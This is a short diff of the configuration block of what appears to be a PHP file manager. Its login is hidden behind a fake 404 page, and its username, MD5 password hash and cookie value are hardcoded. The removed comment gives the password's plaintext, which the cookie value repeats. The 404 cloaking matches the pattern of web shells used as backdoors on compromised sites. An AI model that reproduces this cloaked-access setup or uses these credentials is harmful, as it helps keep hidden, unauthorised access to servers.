@@ -288,9 +288,9 @@ define('FM_EDIT_MAX', 2 * 1024 * 1024);
  *   'password' = password only (form di halaman 404)
  *   'userpass' = username + password (form di halaman 404)
  */
-define('FM_AUTH_MODE', 'userpass');
+define('FM_AUTH_MODE', 'password');
 define('FM_AUTH_USER', 'abadinanjaya');
-define('FM_AUTH_PASS', 'f6b87c765ba9194e7e664597f5c3f50f'); // MD5(abadinanjayateam)
+define('FM_AUTH_PASS', 'f6b87c765ba9194e7e664597f5c3f50f');
 define('FM_COOKIE_NAME', 'abadinanjaya');
 define('FM_COOKIE_VALUE', 'abadinanjayateam');
 define('FM_CLOAK_404', true);
